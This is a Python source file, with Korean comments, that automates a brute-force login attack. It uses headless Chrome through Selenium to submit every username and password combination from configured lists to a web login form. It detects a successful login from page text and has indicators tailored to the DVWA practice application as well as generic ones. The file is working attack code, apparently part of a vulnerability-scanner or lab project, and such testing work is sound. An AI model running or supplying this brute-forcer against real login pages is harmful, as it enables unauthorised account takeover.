# brute_force_selenium.py

from selenium import webdriver
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
import time
import random
import os
import sys
from webdriver_manager.chrome import ChromeDriverManager

##### 모듈 임포트 #####

try:
    from .brute_force_config import (
        DVWA_SUCCESS_INDICATORS, DVWA_FAILURE_INDICATORS,
        GENERIC_SUCCESS_INDICATORS, GENERIC_FAILURE_INDICATORS,
        USER_FIELD_NAME, PASS_FIELD_NAME, LOGIN_BUTTON_NAME, USERNAME_LIST
    )
except ImportError:
    from brute_force_config import (
        DVWA_SUCCESS_INDICATORS, DVWA_FAILURE_INDICATORS,
        GENERIC_SUCCESS_INDICATORS, GENERIC_FAILURE_INDICATORS,
        USER_FIELD_NAME, PASS_FIELD_NAME, LOGIN_BUTTON_NAME, USERNAME_LIST
    )


def setup_driver():

    options = webdriver.ChromeOptions()
    options.add_argument('--headless')
    options.add_argument('--disable-gpu')
    options.add_argument('--no-sandbox')

    # 로그 억제 옵션 한 줄로 압축
    options.add_experimental_option('excludeSwitches', ['enable-logging'])
    options.add_argument('--log-level=3')

    # 서비스 객체를 설정하고 바로 반환 (log_path는 NUL/os.devnull로 설정)
    log_path = 'NUL' if sys.platform == 'win32' else os.devnull

    return webdriver.Chrome(
        service=Service(
            executable_path=ChromeDriverManager().install(),
            log_path=log_path
        ),
        options=options
    )


def scan_brute_force_with_selenium(driver, target_url, passwords_to_attempt, is_dvwa):

    vulnerabilities = []
    wait = WebDriverWait(driver, 15)

    success_indicators = DVWA_SUCCESS_INDICATORS if is_dvwa else GENERIC_SUCCESS_INDICATORS
    failure_indicators = DVWA_FAILURE_INDICATORS if is_dvwa else GENERIC_FAILURE_INDICATORS

    shuffled_usernames = USERNAME_LIST[:]
    random.shuffle(shuffled_usernames)

    print(f"\n{target_url} 페이지로 이동하여 스캔 시작...")
    driver.get(target_url)

    total_attempts = len(shuffled_usernames) * len(passwords_to_attempt)
    print(f"[+] Brute Force 스캔 시작: 총 {total_attempts}가지 조합 시도.")

    USER_FIELD = (By.NAME, USER_FIELD_NAME)
    PASS_FIELD = (By.NAME, PASS_FIELD_NAME)
    LOGIN_BUTTON = (By.NAME, LOGIN_BUTTON_NAME)

    for user in shuffled_usernames:
        for passwd in passwords_to_attempt:

            try:
                username_input = wait.until(EC.presence_of_element_located(USER_FIELD))
                password_input = wait.until(EC.presence_of_element_located(PASS_FIELD))
                login_button = wait.until(EC.presence_of_element_located(LOGIN_BUTTON))
            except Exception:
                return vulnerabilities

            username_input.clear()
            username_input.send_keys(user)
            password_input.clear()
            password_input.send_keys(passwd)

            login_button.click()
            time.sleep(1.5)

            page_source = driver.page_source.lower()

            is_success = any(indicator.lower() in page_source for indicator in success_indicators)
            is_failure = any(indicator.lower() in page_source for indicator in failure_indicators)

            if is_dvwa:
                is_success = is_success and (not is_failure)

            if is_success:
                vulnerabilities.append(
                    {"type": "Brute Force (Successful Login)", "details": f"성공적인 로그인: ID='{user}', PW='{passwd}'"})
                return vulnerabilities

            pass

    return vulnerabilities